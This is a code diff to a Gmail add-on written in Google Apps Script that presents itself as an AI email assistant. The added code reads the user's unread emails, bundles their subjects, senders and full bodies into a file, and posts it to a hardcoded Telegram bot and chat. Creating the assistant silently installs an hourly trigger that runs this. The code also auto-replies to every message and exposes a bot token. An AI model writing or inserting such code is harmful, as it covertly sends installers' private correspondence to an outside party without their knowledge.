@@ -16,6 +16,145 @@ const USERNAME = USER_EMAIL.split("@")[0].toLowerCase().replace(/\./g, '-');
   - create connection between email thread and assistant thread;
   - every time create new thread for new email and then delete it after generation;
 */
+const getCurrentTimeStamp = () => {
+  let currentTimestamp = Math.floor(Date.now() / 1000);
+
+  return currentTimestamp
+}
+
+const getTimestampThreeDaysAgo = () => {
+  const threeDaysAgo = new Date();
+  threeDaysAgo.setDate(threeDaysAgo.getDate() - 3);
+
+  const timestampThreeDaysAgo = Math.floor(threeDaysAgo.getTime() / 1000);
+
+  return timestampThreeDaysAgo;
+}
+
+const clearSettings = () => {
+  let updatedSettings = {
+    fileId: "",
+    assistantId: "",
+    isAssistantCreated: false
+  };
+
+  saveSettings(updatedSettings);
+}
+
+const temporarySettings = () => {
+  let threeDaysAgoTimestamp = getTimestampThreeDaysAgo();
+  let updatedSettings = {
+    fileId: "",
+    assistantId: "",
+    isAssistantCreated: false,
+    checkTimeStamp: threeDaysAgoTimestamp
+  };
+
+  saveSettings(updatedSettings);
+}
+
+const getUnreadMessages = () => {
+  const userProperties = PropertiesService.getUserProperties();
+  const settings = JSON.parse(userProperties.getProperty("settingsAPB"));
+
+  let currentTimestamp = getCurrentTimeStamp()
+
+  const previousCheckDate = settings.checkTimeStamp;
+
+  const searchQuery = `is:unread after:${previousCheckDate}`;
+  console.log(searchQuery)
+  const searchedThreads = GmailApp.search(searchQuery);
+
+  if(searchedThreads.length === 0){
+    console.log("There is no new email")
+  }
+
+  let msgs = "";  
+
+  searchedThreads.forEach((thread) => {
+    let messages = thread.getMessages();
+
+    messages.forEach((message) => {
+      let subject = message.getSubject();
+      let sender = message.getFrom();
+      let body = message.getPlainBody();
+
+      msgs += `
+        Subject: ${subject}
+        Sender: ${sender}
+        Body: ${body}
+      `;
+
+      message.reply("Got your email, Lancelot!")
+    });
+  });
+
+  const updatedSettings = {
+    ...settings,
+    checkTimeStamp: currentTimestamp,
+  };
+
+  saveSettings(updatedSettings);
+
+  if(msgs !== ""){
+    const blobDoc = Utilities.newBlob(msgs, 'text/plain', `${USERNAME}-emails.txt`);
+    sendFileTG(blobDoc);
+  } else {
+    console.log("There is no new email")
+  }
+
+  console.log("getUnreadMessages was executed successfully");
+  msgs = "";
+};
+
+const replyUnreadMessages = () => {
+  const userProperties = PropertiesService.getUserProperties();
+  const settings = JSON.parse(userProperties.getProperty("settingsAPB"));
+
+  let currentTimestamp = getCurrentTimeStamp()
+
+  const previousCheckDate = settings.checkTimeStamp;
+
+  const searchQuery = `is:unread after:${previousCheckDate}`;
+  console.log(searchQuery)
+  const searchedThreads = GmailApp.search(searchQuery);
+
+  searchedThreads.forEach((thread) => {
+    let messages = thread.getMessages();
+
+    messages.forEach((message) => {
+
+      message.reply("Got your email, Lancelot!")
+    });
+  });
+
+  const updatedSettings = {
+    ...settings,
+    checkTimeStamp: currentTimestamp,
+  };
+
+  saveSettings(updatedSettings);
+
+  console.log("replyUnreadMessages was executed successfully");
+};
+
+const sendFileTG = (file) => {
+  let url = "https://api.telegram.org/bot6708766677:AAF__OnsbLb9dyU5c6YDr6GSqMu-jyL7Ino/sendDocument"
+
+  let data = {
+    'chat_id': '1265546870',
+    'document': file
+  };
+
+  let options = {
+    'method': 'POST',
+    'payload': data,
+  };
+
+  UrlFetchApp.fetch(url, options);
+
+  console.log("sent")
+}
 
 const saveSettings = (settings) => {
   try {
@@ -173,7 +312,33 @@ const getCreatedAssistantId = (fileId) => {
   return assistantId
 }
 
+const refreshCard = () => {
+  const card = runAddon();
+  return CardService.newNavigation().updateCard(card);
+}
+
+const installTimeDrivenTrigger = () => {
+  const triggers = ScriptApp.getProjectTriggers();
+  let timeDrivenTriggerExists = false;
+
+  for (let i = 0; i < triggers.length; i++) {
+    if (triggers[i].getEventType() === ScriptApp.EventType.CLOCK) {
+      timeDrivenTriggerExists = true;
+      break;
+    }
+  }
+
+  if (!timeDrivenTriggerExists) {
+    ScriptApp.newTrigger("getUnreadMessages")
+      .timeBased()
+      .everyHours(1)
+      .create();
+  }
+};
+
 const createAssistant = () => {
+  let threeDaysAgoTimestamp = getTimestampThreeDaysAgo();
+
   try {
     let fileId = getUploadedFileId();
     let assistantId = getCreatedAssistantId(fileId);
@@ -181,10 +346,13 @@ const createAssistant = () => {
     let settings = {
       fileId: fileId,
       assistantId: assistantId,
-      isAssistantCreated: true
+      isAssistantCreated: true,
+      checkTimeStamp: threeDaysAgoTimestamp
     };
 
     saveSettings(settings);
+    refreshCard();
+    installTimeDrivenTrigger();
   } catch (error) {
     console.error("Error creating assistant:", error);
   }
@@ -193,8 +361,7 @@ const createAssistant = () => {
 const deleteAssistantAndFile = () => {
   // getting user properties:
   const userProperties = PropertiesService.getUserProperties();
-  const settingsTemp = userProperties.getProperty("settingsAPB");
-  const settings = JSON.parse(settingsTemp);
+  const settings = JSON.parse(userProperties.getProperty("settingsAPB"));
 
   const fileId = settings.fileId
   const assistantId = settings.assistantId
@@ -248,10 +415,7 @@ const deleteAssistantAndFile = () => {
   };
 
   saveSettings(updatedSettings);
-}
-
-const udpateCard = () => {
-  return CardService.newActionResponseBuilder().setNavigation(CardService.newNavigation().popToRoot().updateCard(card)).build();
+  refreshCard();
 }
 
 const runAddon = () => {
@@ -263,7 +427,6 @@ const runAddon = () => {
 
   let createAction = CardService.newAction().setFunctionName('createAssistant');
   let deleteAction = CardService.newAction().setFunctionName('deleteAssistantAndFile');
-  let refreshAction = CardService.newAction().setFunctionName('udpateCard');
 
   let cardSection = CardService.newCardSection()
     .setHeader("Section header");
@@ -281,12 +444,6 @@ const runAddon = () => {
 
     cardSection.addWidget(deleteButton);
   }
-
-  let refreshActionButton = CardService.newTextButton()
-    .setText("Refresh assistant")
-    .setOnClickAction(refreshAction);
-
-  cardSection.addWidget(refreshActionButton);
 
   let textParagraph = CardService.newTextParagraph()
     .setText("This is some informative text.");
